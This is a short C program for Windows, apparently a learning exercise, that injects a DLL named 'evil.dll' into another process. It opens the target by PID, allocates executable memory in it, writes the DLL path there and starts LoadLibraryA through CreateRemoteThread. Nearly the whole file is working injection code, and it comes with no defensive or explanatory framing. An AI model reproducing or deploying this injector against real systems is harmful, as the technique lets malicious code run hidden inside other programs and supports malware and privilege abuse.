#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <tlhelp32.h>

char evildll[] = "C:\\Users\\Dell\\Downloads\\DLL_Injection\\Inject_1\\evil.dll";
unsigned int evillen = sizeof(evildll) + 1;

int main(int argc, char *argv[])
{
    HANDLE ph; // process handle
    HANDLE rt; // remote thread
    LPVOID rb; // remote buffer

    // handle to kernel32 and pass it to GetProcAddress
    HMODULE hKernel32 = GetModuleHandle("Kernel32");
    VOID *lb = GetProcAddress(hKernel32, "LoadLibraryA");

    // parse process ID
    if (atoi(argv[1]) == 0)
    {
        printf("PID not found :( exiting...\n");
        return -1;
    }
    printf("PID: %i", atoi(argv[1]));
    ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, atoi(argv[1]));

    // allocate memory buffer for remote process
    rb = VirtualAllocEx(ph, NULL, evillen, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    // "copy" evil DLL between processes
    WriteProcessMemory(ph, rb, evildll, evillen, NULL);

    // our process start new thread
    rt = CreateRemoteThread(ph, NULL, 0, (LPTHREAD_START_ROUTINE)lb, rb, 0, NULL);
    WaitForSingleObject(rt, INFINITE);
    CloseHandle(ph);
    return 0;
}